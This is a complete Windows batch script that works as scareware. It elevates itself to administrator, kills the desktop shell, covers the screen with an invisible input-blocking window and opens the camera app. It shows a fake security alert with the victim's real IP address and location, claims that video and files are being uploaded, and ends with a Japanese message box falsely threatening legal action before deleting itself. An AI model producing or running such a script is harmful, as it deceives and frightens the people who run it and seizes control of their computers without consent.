@echo off
setlocal enabledelayedexpansion


openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)


set "DUMMY=%USERPROFILE%\Desktop\Database_Archive"
if not exist "%DUMMY%" mkdir "%DUMMY%"
start explorer.exe "%DUMMY%"


start /min microsoft.windows.camera:
timeout /t 2 /nobreak >nul


taskkill /f /im explorer.exe >nul 2>&1


start /min powershell -WindowStyle Hidden -Command ^
    "Add-Type -AssemblyName System.Windows.Forms; ^
    $f = New-Object Windows.Forms.Form; $f.WindowState = 'Maximized'; ^
    $f.Opacity = 0.01; $f.TopMost = $true; $f.FormBorderStyle = 'None'; ^
    $f.ShowDialog()"


start cmd /k "color 0c & mode con: cols=80 lines=20 & title CRITICAL_SECURITY_ALERT & echo ############################################################ & echo #        UNAUTHORIZED DATA ACCESS DETECTED               # & echo ############################################################ & echo. & powershell -Command \"$d=Invoke-RestMethod http://ip-api.com/json/; echo ('[!] TARGET IP   : ' + $d.query); echo ('[!] LOCATION    : ' + $d.city + ', ' + $d.country); echo ('[!] ISP         : ' + $d.isp)\" & echo. & echo [!] RECORDING VIDEO FEED... & echo [!] UPLOADING LOCAL DIRECTORIES... & echo [!] DO NOT POWER OFF. & timeout /t 15"
powershell -Command "for($i=0; $i -lt 10; $i++){ [System.Console]::Beep(4000, 150); [System.Console]::Beep(2500, 150); }"

timeout /t 8 /nobreak >nul


taskkill /f /im powershell.exe >nul 2>&1
taskkill /f /im Microsoft.Camera.exe >nul 2>&1
taskkill /f /im cmd.exe >nul 2>&1
start explorer.exe


powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.MessageBox]::Show('不正アクセスを検知しました。法的措置のため端末情報をサーバへ転送しました。', 'System Error', 'OK', 'Critical')"


rmdir /s /q "%DUMMY%" >nul 2>&1
(goto) 2>nul & del "%~f0"